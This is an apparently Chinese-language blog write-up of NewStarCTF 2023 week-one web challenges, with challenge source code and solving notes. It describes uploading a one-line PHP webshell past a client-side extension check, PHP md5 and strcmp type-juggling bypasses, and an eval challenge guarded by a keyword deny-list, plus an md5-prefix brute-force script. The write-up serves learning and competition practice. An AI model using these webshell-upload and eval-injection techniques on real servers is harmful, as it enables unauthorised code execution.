
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>NewStarCTF 2023 - hybcx's blog</title>

  
    <meta name="description" content="0x01 å‰è¨€ æœ€è¿‘æ–°ç”Ÿèµ›å¾ˆå¤šï¼Œæˆ‘å¾ˆçˆ±ï¼Œä»¥ä¸ºå¯ä»¥é¡ºåˆ©åº¦è¿‡å››å‘¨ï¼ŒæŠŠCTFé¢˜åº§çƒ‚ï¼Œæ²¡æƒ³åˆ°åœ¨SHCTFçš„ç¬¬äºŒå‘¨å°±jiäº†ï¼ˆç›®å‰ä¸ºæ­¢ï¼Œâ”­â”®ï¹â”­â”®æœ‰ä¸¤é“é¢˜ä¸ä¼šï¼Œè¿˜æ˜¯å¤ªèœäº†å”‰ï¼Œäºæ˜¯è½¬æˆ˜newstarï¼Œå¸Œæœ›ä¸è¦æ‰“å‡»æˆ‘äº†ã€‚è¯ä¸å¤šè¯´ç›´æ¥å¼€å· WEEK1|WEB-æ³„æ¼çš„ç§˜å¯† ![image-20231111201723769](NewStarCTF 2023&#x2F;image-20231111201723769.png) æ‹¿">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF 2023">
<meta property="og:url" content="http://hybcx.xyz/2023/10/12/newstarctf-2023/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 å‰è¨€ æœ€è¿‘æ–°ç”Ÿèµ›å¾ˆå¤šï¼Œæˆ‘å¾ˆçˆ±ï¼Œä»¥ä¸ºå¯ä»¥é¡ºåˆ©åº¦è¿‡å››å‘¨ï¼ŒæŠŠCTFé¢˜åº§çƒ‚ï¼Œæ²¡æƒ³åˆ°åœ¨SHCTFçš„ç¬¬äºŒå‘¨å°±jiäº†ï¼ˆç›®å‰ä¸ºæ­¢ï¼Œâ”­â”®ï¹â”­â”®æœ‰ä¸¤é“é¢˜ä¸ä¼šï¼Œè¿˜æ˜¯å¤ªèœäº†å”‰ï¼Œäºæ˜¯è½¬æˆ˜newstarï¼Œå¸Œæœ›ä¸è¦æ‰“å‡»æˆ‘äº†ã€‚è¯ä¸å¤šè¯´ç›´æ¥å¼€å· WEEK1|WEB-æ³„æ¼çš„ç§˜å¯† ![image-20231111201723769](NewStarCTF 2023&#x2F;image-20231111201723769.png) æ‹¿">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-10-12T13:43:44.791Z">
<meta property="article:modified_time" content="2023-11-11T13:13:37.948Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="CTFèµ›äº‹">
<meta name="twitter:card" content="summary">
  
  
  
  <meta name="keywords" content="CTFèµ›äº‹">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">äººç”Ÿå½“æ˜¯ç²¾å½©çš„</div><div class="sub hover cap" style="opacity:0"> ä½•å¿…å¿§è™‘æœªæ¥ï¼</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="ç«™å†…æœç´¢"></form><div id="search-result"></div><div class="search-no-result">æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="åšå®¢" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="æ–‡æ¡£" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="å…³äº" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="å‹é“¾" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">æœ€è¿‘æ›´æ–°</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/"><span class="title">ç¬¬åäº”å±Šåœˆé’±æ¯wp</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-ç¼“å†²åŒºæº¢å‡ºå­¦ä¹ </span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-è¿›æ”»æ€§æ¸—é€æµ‹è¯•</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-åˆ·é¢˜ä¹‹æ—…</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">iæ˜¥ç§‹CTFåˆ·é¢˜</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shellå­¦ä¹ </span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">æµ…æSSTIæ¼æ´</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PINç å­¦ä¹ </span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('æ°¸å¤œ');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('æ°¸æ˜¼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">ä¸»é¡µ</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">æ–‡ç« </a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF%E8%B5%9B%E4%BA%8B/">CTFèµ›äº‹</a></div>
<div class="flex-row" id="post-meta"><span class="text created">å‘å¸ƒäºï¼š<time datetime="2023-10-12T13:43:44.791Z">2023-10-12</time></span><span class="sep updated"></span><span class="text updated">æ›´æ–°äºï¼š<time datetime="2023-11-11T13:13:37.948Z">2023-11-11</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>NewStarCTF 2023</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-å‰è¨€">0x01 å‰è¨€</h1>
<p>æœ€è¿‘æ–°ç”Ÿèµ›å¾ˆå¤šï¼Œæˆ‘å¾ˆçˆ±ï¼Œä»¥ä¸ºå¯ä»¥é¡ºåˆ©åº¦è¿‡å››å‘¨ï¼ŒæŠŠCTFé¢˜åº§çƒ‚ï¼Œæ²¡æƒ³åˆ°åœ¨SHCTFçš„ç¬¬äºŒå‘¨å°±jiäº†ï¼ˆç›®å‰ä¸ºæ­¢ï¼Œâ”­â”®ï¹â”­â”®æœ‰ä¸¤é“é¢˜ä¸ä¼šï¼Œè¿˜æ˜¯å¤ªèœäº†å”‰ï¼Œäºæ˜¯è½¬æˆ˜newstarï¼Œå¸Œæœ›ä¸è¦æ‰“å‡»æˆ‘äº†ã€‚è¯ä¸å¤šè¯´ç›´æ¥å¼€å·</p>
<h2 id="week1web-æ³„æ¼çš„ç§˜å¯†">WEEK1|WEB-æ³„æ¼çš„ç§˜å¯†</h2>
<p>![image-20231111201723769](NewStarCTF 2023/image-20231111201723769.png)</p>
<p>æ‹¿åˆ°ç¬¬ä¸€ä¸ªï¼Œè®¿é—®www.zipæ‹¿åˆ°ç¬¬äºŒä¸ª</p>
<p>![image-20231111201826309](NewStarCTF 2023/image-20231111201826309.png)</p>
<h2 id="week1web-begin-of-upload">WEEK1|WEB-Begin of Upload</h2>
<p>å³é”®æºä»£ç å‘ç°å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>) {
            <span class="hljs-keyword">var</span> fileInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"file"</span>);
            <span class="hljs-keyword">var</span> file = fileInput.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];
            <span class="hljs-keyword">var</span> allowedExtensions = [<span class="hljs-string">"jpg"</span>, <span class="hljs-string">"jpeg"</span>, <span class="hljs-string">"png"</span>, <span class="hljs-string">"gif"</span>];
            <span class="hljs-keyword">var</span> fileExtension = file.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">toLowerCase</span>();
            
            <span class="hljs-keyword">if</span> (!file) {
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">"Please select a file to upload."</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
            
            <span class="hljs-keyword">if</span> (!allowedExtensions.<span class="hljs-title function_">includes</span>(fileExtension)) {
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">"é”™è¯¯çš„æ‹“å±•åï¼Œåªå…è®¸ä¸Šä¼ : JPG, JPEG, PNG, GIF"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
            
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }</code></pre>
<p>å‘ç°åªæ˜¯å‰ç«¯çš„éªŒè¯ï¼Œé‚£æˆ‘ä»¬å…ˆå¯¹æŸä¸ªæ–‡ä»¶å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ¥ç€ä¿®æ”¹åç¼€ä¸ºä¸Šè¿°jså…è®¸çš„ï¼Œä¸Šä¼ åbpæŠ“åŒ…ä¿®æ”¹åç¼€å³å¯</p>
<p>![image-20231111202150535](NewStarCTF 2023/image-20231111202150535.png)</p>
<p>![image-20231111202218089](NewStarCTF 2023/image-20231111202218089.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week1web-begin-of-http">WEEK1|WEB-Begin of HTTP</h2>
<p>![image-20231111202453595](NewStarCTF 2023/image-20231111202453595.png)</p>
<p>å®Œæ•´payloadå¦‚ä¸Šï¼Œå…¶ä¸­secretæŸ¥çœ‹æºä»£ç å³å¯å¾—åˆ°</p>
<h2 id="week1web-errorflask">WEEK1|WEB-ErrorFlask</h2>
<p>flaskæŠ¥é”™é¡µé¢ä¿¡æ¯æ³„éœ²</p>
<p>![image-20231111203220248](NewStarCTF 2023/image-20231111203220248.png)</p>
<p>è¿™é‡Œè®©æˆ‘ä»¬ç»™number1å’Œnumber2ä¼ å‚ï¼Œè¿™é‡Œéšä¾¿ç»™å…¶ä¸­ä¸€ä¸ªä¼ ä¸ªå­—æ¯ï¼Œå‘ç°åˆ°äº†ä¸‹é¢çš„æŠ¥é”™é¡µé¢ï¼Œå³å¯å¾—åˆ°flag</p>
<p>![image-20231111203032827](NewStarCTF 2023/image-20231111203032827.png)</p>
<h2 id="week1web-begin-of-php">WEEK1|WEB-Begin of PHP</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key2'</span>])){
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"=Level 1=&lt;br&gt;"</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key1'</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key2'</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key1'</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key2'</span>])){
        <span class="hljs-variable">$flag1</span> = True;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"nope,this is level 1"</span>);
    }
}

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"=Level 2=&lt;br&gt;"</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'key3'</span>])){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'key3'</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'key3'</span>])){
            <span class="hljs-variable">$flag2</span> = True;
        }
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"nope,this is level 2"</span>);
    }
}

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"=Level 3=&lt;br&gt;"</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key4'</span>])){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key4'</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"/flag"</span>)) == <span class="hljs-number">0</span>){
            <span class="hljs-variable">$flag3</span> = True;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"nope,this is level 3"</span>);
        }
    }
}

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"=Level 4=&lt;br&gt;"</span>;
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key5'</span>])){
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key5'</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key5'</span>] &gt; <span class="hljs-number">2023</span>){
            <span class="hljs-variable">$flag4</span> = True;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"nope,this is level 4"</span>);
        }
    }
}

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"=Level 5=&lt;br&gt;"</span>;
    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[a-zA-Z0-9]/"</span>,<span class="hljs-variable">$var</span>)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"nope,this is level 5"</span>);
        }
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>){
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"/flag"</span>);
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"nope,this is level 5"</span>);
    }
}</code></pre>
<p>ç®€å•çš„PHPç‰¹æ€§</p>
<p>![image-20231111204241044](NewStarCTF 2023/image-20231111204241044.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week1web-rce">WEEK1|WEB-R!C!E!</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'e_v.a.l'</span>])){
    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>]);
    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'e_v.a.l'</span>];
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">"c4d038"</span>){
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|pass|cat|ls/i"</span>,<span class="hljs-variable">$code</span>)){
            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);
        }
    }
}</code></pre>
<p>è¿™é‡Œéœ€è¦èµ°ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib
a=<span class="hljs-built_in">input</span>(<span class="hljs-string">"è¯·è¾“å…¥æ‚¨è¦çˆ†ç ´çš„md5:"</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200000000</span>):

    x=hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(encoding=<span class="hljs-string">'UTF-8'</span>)).hexdigest()

    <span class="hljs-keyword">if</span> (x[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]==a):
        <span class="hljs-built_in">print</span>(x)
        <span class="hljs-built_in">print</span>(i)
        <span class="hljs-keyword">break</span></code></pre>
